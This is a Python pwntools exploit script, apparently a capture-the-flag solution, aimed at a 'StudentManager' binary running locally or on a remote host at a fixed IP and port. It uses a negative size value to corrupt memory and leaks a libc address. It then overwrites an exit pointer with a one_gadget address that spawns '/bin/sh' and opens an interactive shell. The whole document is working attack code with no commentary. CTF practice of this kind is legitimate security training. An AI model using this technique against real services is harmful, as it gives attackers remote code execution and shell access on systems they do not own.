from pwn import *
import time

context.log_level = 'debug'
#context.terminal = ["/usr/bin/tmux", "sp", "-h"]

f_debug = False if "remote" in sys.argv else True

vuln_name = "./StudentManager"
libc_path = "./libc-2.31.so"

elf, rop = ELF(vuln_name), ROP(vuln_name)
libc, roplibc = ELF(libc_path), ROP(libc_path)

if f_debug:
    io = process(vuln_name)
else:
    io = remote("39.102.55.191", 9998)


def ddebug(b):
    gdb.attach(io, b)
    pause()


def add(name, size, desc):
    io.sendlineafter(">> ", str(1))
    io.sendlineafter("Name: \n", name)
    io.sendlineafter("Size: \n", str(size))
    if size > 256:
        return

    io.sendafter("Description: \n", desc)


def show(idx):
    io.sendlineafter(">> ", str(3))
    io.sendlineafter("show: \n", str(idx))


def edit(idx, name, desc):
    io.sendlineafter(">> ", str(2))
    io.sendlineafter("edit: ", str(idx))
    io.sendlineafter("Name: ", name)
    io.sendlineafter("description: ", desc)


def exit():
    io.sendlineafter(">> ", str(4))


checkfail_pool_offset = 0x4320 - 0x4020
add("a" * 1, 0 - checkfail_pool_offset, "b")
#ddebug("b *addStudent+135")
add("a" * 1, 5 * 8, "b" * 8)
show(1)

libcsetvbuf_offset = u64(io.recvuntil(b"\x7f")[-6:].ljust(8, b"\x00"))
libc.address = libcsetvbuf_offset - libc.symbols["printf"]
success("libc address -> " + hex(libc.address))

# exit -> onegadget
"""
0xe3b2e execve("/bin/sh", r15, r12)
0xe3b31 execve("/bin/sh", r15, rdx)
0xe3b34 execve("/bin/sh", rsi, rdx)
"""
add("a" * 1, 100, p64(libc.address + 0xe3b31))
exit()

io.interactive()
